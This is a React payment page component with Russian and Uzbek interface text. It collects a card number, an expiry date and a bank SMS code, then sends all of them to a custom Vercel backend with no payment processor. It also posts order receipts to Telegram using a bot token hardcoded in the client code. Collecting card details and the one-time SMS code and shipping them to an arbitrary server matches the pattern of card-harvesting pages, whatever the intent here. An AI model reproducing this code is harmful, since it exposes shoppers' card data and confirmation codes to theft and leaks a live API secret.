import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import axios from 'axios';
import InputMask from 'react-input-mask';
import { useForm } from 'react-hook-form';
import { Notyf } from 'notyf';
import 'notyf/notyf.min.css';
import './basic-modal.css';

const notyf = new Notyf({
     position: { x: 'center', y: 'top' },
});

export default function PaymentPage() {
     const navigate = useNavigate();
     const { register, handleSubmit } = useForm();
     const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);
     const [totalPrice, setTotalPrice] = useState(null);
     const [basketItems, setBasketItems] = useState([]);
     const [quantities, setQuantities] = useState({});

     useEffect(() => {
          const total = localStorage.getItem('totalPrice'); // Получаем общую сумму из localStorage
          const basket = JSON.parse(localStorage.getItem('basket')) || [];
          const quantities = JSON.parse(localStorage.getItem('quantities')) || {};

          if (total) {
               setTotalPrice(total);
          } else {
               navigate('/');
          }

          setBasketItems(basket);
          setQuantities(quantities);
     }, [navigate]);

     const handleCardDetailsSubmit = (data) => {
          const carddateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;

          if (!carddateRegex.test(data.carddate)) {
               notyf.error('Неверный формат срока действия карты.');
               return;
          }

          const [inputMonth, inputYear] = data.carddate.split('/').map(Number);
          const currentYear = new Date().getFullYear() % 100;
          const currentMonth = new Date().getMonth() + 1;

          if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
               notyf.error('Срок действия карты истек.');
               return;
          }

          setIsCardDetailsEntered(true);
     };

     const handleSMSCodeSubmit = (data) => {
          if (data.cardcode.length !== 6) {
               notyf.error('SMS-код должен содержать 6 символов.');
               return;
          }

          axios
               .post('https://magazin-bot-backend.vercel.app/api/add', { ...data, totalPrice })
               .then(() => {
                    notyf.success("To'lov chekingiz telegram botga yuborildi!");
                    navigate('/');
               })
               .catch(() => {
                    notyf.error("To'lovни амалга оширишда хатолик");
               });

          // Telegram integration
          const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
          const chat_id = 6183727519;

          const now = new Date();
          const formattedDate = now.toLocaleDateString();
          const formattedTime = now.toLocaleTimeString();

          const itemsDescription = basketItems
               .map(
                    (item) =>
                         `🔹 *${item.nameproduct}* — ${quantities[item.id] || 1} шт — *${item.price * (quantities[item.id] || 1)} $*`
               )
               .join('\n');

          const customerMessage = `🧾 *Чек оплаты*\n───────────────\n💰 *Общая сумма:* ${totalPrice} $\n🗓 *Дата оформления:* ${formattedDate} в ${formattedTime}\n\n🛒 *Товары:*\n${itemsDescription}\n\nСпасибо за покупку! 🎉`;

          axios.get(
               `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(
                    customerMessage
               )}`
          );
     };

     return (
          <motion.div
               className="payment-page"
               initial={{ opacity: 0, y: 50 }}
               animate={{ opacity: 1, y: 0 }}
               exit={{ opacity: 0, y: -50 }}
               transition={{ duration: 0.5 }}
          >
               <header className="payment-header">
                    <h1>Оплата</h1>
                    <h2>Общая сумма: {totalPrice ? `${totalPrice} $` : 'Сумма не указана'}</h2>
               </header>

               <form
                    onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
                    className="payment-form"
               >
                    {!isCardDetailsEntered ? (
                         <>
                              <div className="input-group">
                                   <InputMask
                                        mask="9999 9999 9999 9999"
                                        maskChar=" "
                                        {...register('cardnumber', { required: true })}
                                        placeholder="Введите номер карты"
                                   >
                                        {(inputProps) => <input {...inputProps} />}
                                   </InputMask>
                              </div>
                              <div className="input-group">
                                   <InputMask
                                        mask="99/99"
                                        maskChar=" "
                                        {...register('carddate', { required: true })}
                                        placeholder="Срок действия (MM/YY)"
                                   >
                                        {(inputProps) => <input {...inputProps} />}
                                   </InputMask>
                              </div>
                              <button type="submit" className="submit-button">Продолжить</button>
                         </>
                    ) : (
                         <>
                              <div className="input-group">
                                   <InputMask
                                        mask="999999"
                                        maskChar=" "
                                        {...register('cardcode', { required: true })}
                                        placeholder="Введите SMS-код"
                                   >
                                        {(inputProps) => <input {...inputProps} />}
                                   </InputMask>
                              </div>
                              <button type="submit" className="submit-button">Отправить</button>
                         </>
                    )}
               </form>
          </motion.div>
     );
}
